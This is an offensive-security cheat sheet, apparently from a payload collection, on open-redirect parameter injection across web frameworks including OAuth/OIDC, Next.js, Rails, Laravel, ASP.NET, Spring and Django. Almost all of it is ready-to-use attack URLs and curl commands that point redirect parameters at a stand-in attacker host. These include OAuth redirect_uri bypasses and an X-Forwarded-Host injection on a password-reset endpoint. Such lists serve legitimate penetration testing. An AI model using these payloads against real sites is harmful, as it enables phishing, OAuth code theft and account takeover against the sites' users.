# Parameter Injection — Framework-Specific Redirects

## Summary
Exploiting redirect parameters unique to specific frameworks and patterns.

## OAuth / OpenID Connect

```bash
# OAuth redirect_uri parameter
https://target.com/oauth/authorize?client_id=xxx&redirect_uri=http://attacker.com/&response_type=code
# If whitelisted, try path traversal on allowed domain
https://target.com/oauth/authorize?client_id=xxx&redirect_uri=https://allowed.com@attacker.com/
# Use path confusion
https://target.com/oauth/authorize?client_id=xxx&redirect_uri=https://allowed.com.evil.com/
```

## Next.js / React / SPA Frameworks

```bash
# Next.js redirect query param
https://target.com/login?redirect=/dashboard -> try
https://target.com/login?redirect=http://attacker.com

# React Router — return parameter
https://target.com/login?returnUrl=http://attacker.com
https://target.com/login?returnUrl=//attacker.com

# Angular built-in redirect
https://target.com/#/login?redirect=http://attacker.com
```

## Ruby on Rails

```bash
# Rails redirect_to :back parameter
POST /login  with header Referer: http://attacker.com

# Rails redirect_to with params
/redirect?url=http://attacker.com
/redirect?destination=http://attacker.com

# Rails Open Redirect via '..' path traversal
/redirect?url=//attacker.com
```

## PHP Frameworks (Laravel, Symfony)

```bash
# Laravel redirect()->intended()
https://target.com/login?redirect=http://attacker.com

# Symfony RedirectResponse
https://target.com/admin?redirect_to=http://attacker.com

# Generic PHP header() redirect
/redirect.php?url=http://attacker.com
```

## ASP.NET / .NET Core

```bash
# ReturnUrl parameter
https://target.com/Account/Login?ReturnUrl=http://attacker.com
https://target.com/Account/Login?ReturnUrl=//attacker.com

# LocalReturnUrl — may have weaker validation
https://target.com/Account/Login?LocalReturnUrl=http://attacker.com

# Open redirect via vulnerable Redirect method
https://target.com/Home/Redirect?url=http://attacker.com
```

## Java / Spring

```bash
# Spring Security redirect strategy
https://target.com/login?redirect=http://attacker.com

# Spring Social redirect_uri
https://target.com/auth?redirect_uri=http://attacker.com

# Spring MVC RedirectView
https://target.com/redirect?target=http://attacker.com
```

## Django / Python

```bash
# Django next parameter
https://target.com/login/?next=http://attacker.com

# Django RedirectView
https://target.com/go/?url=http://attacker.com

# Flask redirect with next
https://target.com/login?next=http://attacker.com
```

## Exploitation via POST / JSON

```bash
# Redirect parameter in POST body
curl -X POST https://target.com/login -d "username=admin&password=test&redirect=http://attacker.com"

# JSON body redirect
curl -X POST https://target.com/api/login -H "Content-Type: application/json" -d '{"user":"admin","redirect":"http://attacker.com"}'

# Header-based redirect (X-Forwarded-Host, Host injection)
curl -H "X-Forwarded-Host: attacker.com" https://target.com/reset-password
```

